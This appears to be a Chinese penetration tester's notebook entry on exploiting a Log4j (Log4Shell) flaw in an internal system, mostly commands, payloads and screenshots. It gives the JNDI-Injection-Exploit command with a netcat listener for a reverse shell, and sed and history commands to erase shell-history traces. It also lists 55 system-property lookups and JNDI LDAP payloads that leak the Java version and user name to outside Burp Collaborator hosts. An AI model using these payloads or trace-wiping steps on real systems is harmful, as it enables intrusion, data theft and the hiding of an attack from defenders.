测一个内网的系统，发现bp插件扫出来存在log4j漏洞<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640588280600-d5e649f9-9d2c-4633-809e-5230b91d9796.png#clientId=u1d411766-baa2-4&from=paste&height=425&id=ubbe77569&originHeight=849&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&size=126901&status=done&style=none&taskId=u80d267c0-6d87-4ea3-a005-e004b8d55ba&title=&width=486)

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "执行的命令" -A "服务器本身ip"  ， 同时开启nc监听对应的端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640588348748-962bba80-5dee-49e1-a636-66cb88006eed.png#clientId=u1d411766-baa2-4&from=paste&height=341&id=u5cdddc76&originHeight=681&originWidth=1463&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132531&status=done&style=none&taskId=u9c052e9a-4dab-40ab-83ac-dbe7229f045&title=&width=731.5)<br />请求包发送rmi攻击payload<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640588406638-02a61d0c-3e9b-41b2-9cd2-e0fe0d52dc00.png#clientId=u1d411766-baa2-4&from=paste&height=360&id=ud253fc98&originHeight=720&originWidth=1693&originalType=binary&ratio=1&rotation=0&showTitle=false&size=121603&status=done&style=none&taskId=u8d31e1de-2db1-4139-87d4-d481fbc2246&title=&width=846.5)<br />成功获取反弹shell ，发现history全都是base解密后的bash反弹shell日志<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1640588459459-de33c3fe-9568-43cb-97da-880154348f75.png#clientId=u1d411766-baa2-4&from=paste&height=521&id=u1a97c25e&originHeight=676&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70513&status=done&style=none&taskId=u1a6ac821-2254-4f7c-8407-329011c5d00&title=&width=406.5)

半交互下删除history痕迹<br />sed '96,$d' -i .bash_history  删除从第96行（包括第96行）到文件末尾的所有行<br />history -r  更新一下



```java
id        usage
1        ${sys:awt.toolkit}
2        ${sys:file.encoding}
3        ${sys:file.encoding.pkg}
4        ${sys:file.separator}
5        ${sys:java.awt.graphicsenv}
6        ${sys:java.awt.printerjob}
7        ${sys:java.class.path}
8        ${sys:java.class.version}
9        ${sys:java.endorsed.dirs}
10        ${sys:java.ext.dirs}
11        ${sys:java.home}
12        ${sys:java.io.tmpdir}
13        ${sys:java.library.path}
14        ${sys:java.runtime.name}
15        ${sys:java.runtime.version}
16        ${sys:java.specification.name}
17        ${sys:java.specification.vendor}
18        ${sys:java.specification.version}
19        ${sys:java.vendor}
20        ${sys:java.vendor.url}
21        ${sys:java.vendor.url.bug}
22        ${sys:java.version}
23        ${sys:java.vm.info}
24        ${sys:java.vm.name}
25        ${sys:java.vm.specification.name}
26        ${sys:java.vm.specification.vendor}
27        ${sys:java.vm.specification.version}
28        ${sys:java.vm.vendor}
29        ${sys:java.vm.version}
30        ${sys:line.separator}
31        ${sys:os.arch}
32        ${sys:os.name}
33        ${sys:os.version}
34        ${sys:path.separator}
35        ${sys:sun.arch.data.model}
36        ${sys:sun.boot.class.path}
37        ${sys:sun.boot.library.path}
38        ${sys:sun.cpu.endian}
39        ${sys:sun.cpu.isalist}
40        ${sys:sun.desktop}
41        ${sys:sun.io.unicode.encoding}
42        ${sys:sun.java.command}
43        ${sys:sun.java.launcher}
44        ${sys:sun.jnu.encoding}
45        ${sys:sun.management.compiler}
46        ${sys:sun.os.patch.level}
47        ${sys:sun.stderr.encoding}
48        ${sys:user.country}
49        ${sys:user.dir}
50        ${sys:user.home}
51        ${sys:user.language}
52        ${sys:user.name}
53        ${sys:user.script}
54        ${sys:user.timezone}
55        ${sys:user.variant}
```
${jndi:ldap://${sys:java.version}.qsmdx3codwj58v3trcivswbfn6txhm.burpcollaborator.net/sWM}

${jndi:ldap://${sys:user.name}.5bhsgiv3wb2kram8ar1abbuu6lcb00.burpcollaborator.net/sWM}<br />${sys:os.name}

 java.home<br />${jndi:ldap://xxx:1389/${sys:os.name}}<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1642561565469-9b4687bc-2f7c-413a-b55f-b2a82b93a080.png#clientId=u21c53a69-5b7d-4&from=paste&height=151&id=u9ca7bc98&originHeight=166&originWidth=339&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9025&status=done&style=none&taskId=udec11742-6227-427e-987e-fde072a8a47&title=&width=308.5)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1642562767248-dd927159-8d3d-4ab5-a371-de6e9c2cbce4.png#clientId=ufeed7018-95ed-4&from=paste&height=287&id=u3d87ca38&originHeight=573&originWidth=1734&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134082&status=done&style=none&taskId=ud6b73cc9-f8a9-4e35-893a-93f811b6a7f&title=&width=867)
